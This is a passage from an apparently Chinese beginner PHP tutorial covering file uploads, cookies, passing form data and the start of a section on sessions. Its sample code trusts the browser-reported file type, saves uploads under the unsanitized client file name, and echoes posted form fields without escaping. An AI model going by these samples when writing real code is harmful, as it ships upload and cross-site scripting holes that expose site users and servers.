|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/pjpeg"))
&& ($_FILES["file"]["size"] < 20000))
  {
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Error: " . $_FILES["file"]["error"] . "<br />";
    }
  else
    {
    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Stored in: " . $_FILES["file"]["tmp_name"];
    }
  }
else
  {
  echo "Invalid file";
  }

?>
```

**注释：**对于 IE，识别 jpg 文件的类型必须是 pjpeg，对于 FireFox，必须是 jpeg。

## 保存被上传的文件

上面的例子在服务器的 PHP 临时文件夹创建了一个被上传文件的临时副本。

这个临时的复制文件会在脚本结束时消失。要保存被上传的文件，我们需要把它拷贝到另外的位置：

```php
<?php
if ((($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/pjpeg"))
&& ($_FILES["file"]["size"] < 20000))
  {
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
    }
  else
    {

    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

    if (file_exists("upload/" . $_FILES["file"]["name"]))
      {
      echo $_FILES["file"]["name"] . " already exists. ";
      }
    else
      {
      move_uploaded_file($_FILES["file"]["tmp_name"],
      "upload/" . $_FILES["file"]["name"]);
      echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
      }
    }
  }
else
  {
  echo "Invalid file";
  }
?>
```

上面的脚本检测了是否已存在此文件，如果不存在，则把文件拷贝到指定的文件夹。

**注释：**这个例子把文件保存到了名为 "upload" 的新文件夹。

## PHP cookies

**cookie 常用于识别用户。**

### 什么是 Cookie？

cookie 常用于识别用户和记录用户状态。cookie 是服务器留在用户计算机中的小文件。每当相同的计算机通过浏览器请求页面时，它同时会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。

### 如何创建 cookie？

setcookie() 函数用于设置 cookie。

**注释：**setcookie() 函数必须位于 <html> 标签之前。

```
setcookie(name, value, expire, path, domain);//expire 失效
```

在下面的例子中，我们将创建名为 "user" 的 cookie，把为它赋值 "Alex Porter"。我们也规定了此 cookie 在一小时后过期：

```php
<?php 
setcookie("user", "Alex Porter", time()+3600);
?>
<html>
<body>

</body>
</html>
```

**注释：**在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码（为防止 URL 编码，请使用 setrawcookie() 取而代之）。

### 如何取回 Cookie 的值？

PHP 的 $_COOKIE 变量用于取回 cookie 的值。

在下面的例子中，我们取回了名为 "user" 的 cookie 的值，并把它显示在了页面上：

```php
<?php
// Print a cookie
echo $_COOKIE["user"];

// A way to view all cookies
print_r($_COOKIE);
?>
```

在下面的例子中，我们使用 isset() 函数来确认是否已设置了 cookie：

```php
<html>
<body>

<?php
if (isset($_COOKIE["user"]))
  echo "Welcome " . $_COOKIE["user"] . "!<br />";
else
  echo "Welcome guest!<br />";
?>

</body>
</html>
```

### 如何删除 cookie？

当删除 cookie 时，您应当使过期日期变更为过去的时间点。

删除的例子：

```
<?php 
// set the expiration date to one hour ago
setcookie("user", "", time()-3600);
?>
```

### 如果浏览器不支持 cookie 该怎么办？

如果您的应用程序涉及不支持 cookie 的浏览器，您就不得不采取其他方法在应用程序中从一张页面向另一张页面传递信息。一种方式是从表单传递数据（有关表单和用户输入的内容，稍早前我们已经在本教程中介绍过了）。或者通过URL传输数据。

下面的表单在用户单击提交按钮时向 "welcome.php" 提交了用户输入：

```
<html>
<body>

<form action="welcome.php" method="post">
Name: <input type="text" name="name" />
Age: <input type="text" name="age" />
<input type="submit" />
</form>

</body>
</html>
```

取回 "welcome.php" 中的值，就像这样：

```
<html>
<body>

Welcome <?php echo $_POST["name"]; ?>.<br />
You are <?php echo $_POST["age"]; ?> years old.

</body>
</html>
```

## PHP Session

**PHP session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。**